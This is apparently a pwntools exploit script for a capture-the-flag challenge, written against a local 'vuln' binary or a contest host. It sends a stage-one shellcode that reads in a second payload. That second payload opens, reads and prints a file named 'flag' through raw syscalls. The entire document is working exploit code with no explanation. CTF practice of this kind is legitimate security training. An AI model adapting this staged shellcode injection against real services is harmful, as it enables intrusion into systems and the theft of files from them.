from pwn import * 
from pwn import p64


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host,30153)#远程连接
    gdb_is =0
# elf = cdll.LoadLibrary('libc.so.6')
# elf = ELF('./pwn')

if gdb_is:
    gdb.attach(r,'*b 0x4012ed')
    pause()
    pass

payload = asm(
    '''
xor rdi,rdi
mov rsi,rdx
add rsi,12
syscall
    '''
)


r.sendafter(b'shellcode:',payload)
sleep(1)

shellcode = asm('''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
    ''')
r.send(shellcode)
# print(r.recvuntil(b'}'))
r.interactive()
